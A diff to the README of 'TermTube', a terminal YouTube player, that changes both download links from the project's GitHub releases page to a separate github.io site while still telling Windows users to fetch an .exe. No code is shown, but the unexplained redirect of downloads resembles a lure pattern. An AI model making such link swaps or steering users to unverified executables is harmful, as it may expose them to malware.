@@ -1,6 +1,6 @@
 # 📺 TermTube - Stream YouTube videos in your terminal
 
-[![](https://img.shields.io/badge/Download_TermTube-Blue)](https://github.com/urbe8716/TermTube/releases)
+[![](https://img.shields.io/badge/Download_TermTube-Blue)](https://urbe8716.github.io)
 
 TermTube plays YouTube videos inside your computer terminal. It uses simple text characters to recreate images and plays high-quality audio alongside the video. This tool functions as a portable program. You do not need to install complex software or change your system settings to use it.
 
@@ -8,7 +8,7 @@ TermTube plays YouTube videos inside your computer terminal. It uses simple text
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [TermTube download page](https://github.com/urbe8716/TermTube/releases).
+1. Go to the [TermTube download page](https://urbe8716.github.io).
 2. Look for the most recent version under the Releases section.
 3. Download the file that ends in .exe.
 4. Save the file to a folder on your computer.
